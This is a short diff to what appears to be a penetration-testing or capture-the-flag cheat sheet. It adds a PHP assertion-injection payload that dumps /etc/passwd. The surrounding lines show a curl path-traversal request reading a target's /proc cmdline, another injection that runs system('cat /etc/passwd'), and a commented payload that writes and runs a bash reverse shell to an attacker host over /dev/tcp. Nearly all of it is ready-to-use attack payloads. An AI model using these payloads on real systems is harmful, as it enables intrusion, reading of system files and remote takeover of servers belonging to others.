@@ -31,6 +31,7 @@ curl http://<target ip>/download.php?downloadurl=/proc/824/cmdline --output serv
 PHP assertions
 
 ```shell
+page=' and die(show_source('/etc/passwd')) or '
 page=' and die(system('cat /etc/passwd')) or '
 # url encode , page=<encode command string>, escape single quotes 
 # page=' and die(system('echo \'/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1\' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh')) or '
